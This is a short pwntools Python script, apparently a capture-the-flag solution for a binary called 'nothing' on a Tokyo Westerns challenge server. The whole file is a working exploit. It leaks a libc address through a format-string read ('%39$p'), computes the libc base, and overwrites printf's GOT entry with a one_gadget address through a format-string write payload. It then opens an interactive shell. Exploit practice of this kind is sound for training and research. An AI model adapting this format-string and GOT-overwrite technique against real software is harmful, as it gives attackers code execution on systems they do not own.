from pwn import *
import sys

context.clear(arch='amd64', os='linux')

argv = sys.argv
binary_path = './nothing'
REMOTE = 'remote' in argv
DEBUG = 'debug' in argv

if REMOTE:
	sh = remote('pwn02.chal.ctf.westerns.tokyo', 18247)
else:
	sh = process([binary_path])

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', checksec=False)

e = ELF(binary_path)

# ------------- plan -----------
# leak main return address using format string
# overwrite printf@got with one_gadget

sh.sendlineafter('> ', '%39$p')
leak = int(sh.recvline()[2:-1], 16)
libc.address = leak  - 231 - libc.sym['__libc_start_main']

log.info('leak: {}'.format(hex(leak)))
log.info('libc base: {}'.format(hex(libc.address)))

one_gadget = libc.address + 0x10a45c
printf_got = e.got['printf']
payload = fmtstr_payload(6, {printf_got: one_gadget}, write_size='short')

log.info('one gadget: {}'.format(hex(one_gadget)))
log.info('printf got: {}'.format(hex(printf_got)))
log.info('payload: {}'.format(hexdump(payload)))

sh.sendlineafter('> ', payload)

sh.interactive()
